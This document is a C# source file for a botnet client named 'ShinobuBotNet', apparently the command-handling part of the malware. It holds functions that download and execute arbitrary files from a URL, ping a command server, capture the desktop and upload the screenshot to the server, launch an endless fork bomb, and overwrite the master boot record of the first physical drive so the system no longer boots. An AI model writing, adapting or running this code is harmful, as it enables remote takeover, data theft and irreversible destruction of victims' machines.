using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Windows.Forms;

namespace ShinobuBotNet
{
    class functions
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
        string lpFileName,
         uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);


        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }

        public static void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URI);
                Process.Start(file_path);
            });
            thr.Start();
        }

        public static void ping()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string PingURI = config.server + "ping.php";
            Thread thr = new Thread(() =>
           {
               wc.DownloadString(PingURI);
           });
            thr.Start();

        }

        public static void forkbomb()
        {
            Thread thr = new Thread(() =>
            {
                ProcessStartInfo psi;
                psi = new ProcessStartInfo("cmd", @"start");
                while (true)
                {
                    Process.Start(psi);
                }
            });
            thr.Start();
        }
        

        public static void screenshot()
        {
            Thread thr = new Thread(() =>
            {
                //делаем скрин
                string filename = "screnshot.jpg";
                utils.desktopScreenshot(filename);
                //отправка файла
                WebClient wc = new WebClient();
                wc.Proxy = null;
                wc.UploadFile(config.server + "upload.php", filename);
            });

        }


        public static void MSG(string text)
        {
            System.Windows.MessageBox.Show(text);
        }

        // Overwrite MBR (destroy system)
        public static void DestroySystem()
        {
            Thread thr = new Thread(() =>
            {
                uint GenericAll = 0x10000000;
                //dwShareMode
                uint FileShareRead = 0x1;
                uint FileShareWrite = 0x2;
                //dwCreationDisposition
                uint OpenExisting = 0x3;
                //dwFlagsAndAttributes
                uint MbrSize = 512u;

                var mbrData = new byte[MbrSize];

                var mbr = CreateFile(
                    "\\\\.\\PhysicalDrive0",
                    GenericAll,
                    FileShareRead | FileShareWrite,
                    IntPtr.Zero,
                    OpenExisting, 0, IntPtr.Zero);

                if (mbr == (IntPtr)(-0x1))
                {
                    Console.WriteLine(" Please start as admin!");
                    return;
                }

                if (WriteFile(
                    mbr,
                    mbrData,
                    MbrSize,
                    out uint lpNumberOfBytesWritten,
                    IntPtr.Zero))
                {
                    Console.WriteLine("The boot sector has been overwritten. The system will no longer boot.");
                    return;
                }
                else
                {
                    Console.WriteLine(" Failed overwrite boot sector.");
                    return;
                }
            });
            thr.Start();
        }
    }
}
